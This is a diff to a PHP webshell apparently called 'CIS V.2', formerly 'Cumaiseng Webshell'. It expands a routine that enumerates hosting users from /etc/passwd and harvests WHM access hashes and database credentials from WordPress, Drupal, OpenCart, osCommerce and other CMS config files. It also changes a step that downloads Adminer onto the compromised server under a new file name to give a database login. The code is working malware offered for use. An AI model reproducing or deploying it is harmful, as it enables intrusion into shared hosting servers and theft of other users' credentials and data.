@@ -13,12 +13,11 @@ error_reporting(0);
 ?>
 <html>
 <head>
-<title>Cumaiseng Webshell</title>
-<link rel="shortcut icon" href="http://www.cumaiseng.org/assets/images/music.png"/>
+<title><?=$_SERVER['HTTP_HOST']?> - CIS V.2</title>
+<link rel="shortcut icon" href="http://cumaiseng.github.io/assets/tool.png"/>
 <link rel="stylesheet" href="https://cumaiseng.github.io/assets/titip.css"/>
 </head>
 <?php
-
 function w($dir,$perm) {
 	if(!is_writable($dir)) {
 		return "<font color=maroon>".$perm."</font>";
@@ -851,6 +850,10 @@ preg_match_all('/(.*?):x:/', $passwd, $user_config);
 foreach($user_config[1] as $user_iseng) {
 $grab_config = array(
 "/home/$user_iseng/.accesshash" => "WHM-accesshash",
+"/home/$user_iseng/.myaccesshash" => "WHM-accesshash",
+"/home/$user_iseng/.my-accesshash" => "WHM-accesshash",
+"/home/$user_iseng/.backupaccesshash" => "WHM-accesshash",
+"/home/$user_iseng/.backup-accesshash" => "WHM-accesshash",
 "/home/$user_iseng/core/db.php" => "Rumahmedia",
 "/home/$user_iseng/public_html/core/db.php" => "Rumahmedia",
 "/home/$user_iseng/public_html/config.inc.php" => "OJS",
@@ -862,33 +865,31 @@ $grab_config = array(
 "/home/$user_iseng/public_html/class.php" => "KPT",
 "/home/$user_iseng/public_html/backend/class.php" => "KPT",
 "/home/$user_iseng/public_html/koneksi.php" => "Lokomedia",
+"/home/$user_iseng/public_html/config.php" => "Lokomedia",
+"/home/$user_iseng/public_html/config/config.php" => "Lokomedia",
 "/home/$user_iseng/public_html/config/koneksi.php" => "Lokomedia",
+"/home/$user_iseng/public_html/konfig/koneksi.php" => "Lokomedia",
 "/home/$user_iseng/public_html/konfigurasi/koneksi.php" => "Formulasi",
-"/home/$user_iseng/public_html/forum/config.php" => "phpBB",
 "/home/$user_iseng/public_html/sites/default/settings.php" => "Drupal",
 "/home/$user_iseng/public_html/config/settings.inc.php" => "PrestaShop",
-"/home/$user_iseng/public_html/app/etc/local.xml" => "Magento",
 "/home/$user_iseng/public_html/admin/config.php" => "OpenCart",
 "/home/$user_iseng/public_html/application/config/database.php" => "Ellislab",
-"/home/$user_iseng/public_html/vb/includes/config.php" => "Vbulletin",
-"/home/$user_iseng/public_html/includes/config.php" => "Vbulletin",
-"/home/$user_iseng/public_html/forum/includes/config.php" => "Vbulletin",
-"/home/$user_iseng/public_html/forums/includes/config.php" => "Vbulletin",
-"/home/$user_iseng/public_html/cc/includes/config.php" => "Vbulletin",
-"/home/$user_iseng/public_html/inc/config.php" => "MyBB",
 "/home/$user_iseng/public_html/includes/configure.php" => "OsCommerce",
 "/home/$user_iseng/public_html/shop/includes/configure.php" => "OsCommerce",
 "/home/$user_iseng/public_html/os/includes/configure.php" => "OsCommerce",
 "/home/$user_iseng/public_html/oscom/includes/configure.php" => "OsCommerce",
 "/home/$user_iseng/public_html/products/includes/configure.php" => "OsCommerce",
 "/home/$user_iseng/public_html/cart/includes/configure.php" => "OsCommerce",
-"/home/$user_iseng/public_html/inc/conf_global.php" => "IPB",
+"/home/$user_iseng/public_html/core/db.config.php" => "UnknownDB",
+"/home/$user_iseng/public_html/assets/library/global/libDB.php" => "UnknownDB",
+"/home/$user_iseng/public_html/models/db.php" => "UnknownDB",
 "/home/$user_iseng/public_html/wp-config.php" => "Wordpress",
 "/home/$user_iseng/public_html/wp/test/wp-config.php" => "Wordpress",
 "/home/$user_iseng/public_html/blog/wp-config.php" => "Wordpress",
 "/home/$user_iseng/public_html/beta/wp-config.php" => "Wordpress",
 "/home/$user_iseng/public_html/portal/wp-config.php" => "Wordpress",
 "/home/$user_iseng/public_html/site/wp-config.php" => "Wordpress",
+"/home/$user_iseng/public_html/forum/wp-config.php" => "Wordpress",
 "/home/$user_iseng/public_html/wp/wp-config.php" => "Wordpress",
 "/home/$user_iseng/public_html/WP/wp-config.php" => "Wordpress",
 "/home/$user_iseng/public_html/news/wp-config.php" => "Wordpress",
@@ -979,29 +980,6 @@ $grab_config = array(
 "/home/$user_iseng/public_html/my/bb-config.php" => "BoxBilling",
 "/home/$user_iseng/public_html/secure/bb-config.php" => "BoxBilling",
 "/home/$user_iseng/public_html/support/order/bb-config.php" => "BoxBilling",
-"/home/$user_iseng/public_html/includes/dist-configure.php" => "Zencart",
-"/home/$user_iseng/public_html/zencart/includes/dist-configure.php" => "Zencart",
-"/home/$user_iseng/public_html/products/includes/dist-configure.php" => "Zencart",
-"/home/$user_iseng/public_html/cart/includes/dist-configure.php" => "Zencart",
-"/home/$user_iseng/public_html/shop/includes/dist-configure.php" => "Zencart",
-"/home/$user_iseng/public_html/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/hostbills/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/host/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/Host/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/supportes/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/support/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/hosting/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/cart/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/order/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/client/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/clients/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/cliente/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/clientes/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/billing/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/billings/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/my/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/secure/includes/iso4217.php" => "Hostbills",
-"/home/$user_iseng/public_html/support/order/includes/iso4217.php" => "Hostbills"
 );  
 
 foreach($grab_config as $config => $nama_config) {
@@ -1380,11 +1358,11 @@ echo'<a href="iseng_sym404/" target="_blank">Klik Here</a>';
 		ob_flush();
 		flush();
 	}
-	if(file_exists('adminer.php')) {
-		echo "<center><font color=green><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+	if(file_exists('k-adminer.php')) {
+		echo "<center><font color=green><a href='$full/k-adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 	} else {
-		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
-			echo "<center><font color=green><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+		if(adminer("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1-en.php","k-adminer.php")) {
+			echo "<center><font color=green><a href='$full/k-adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 		} else {
 			echo "<center><font color=maroon>gagal buat file adminer</font></center>";
 		}
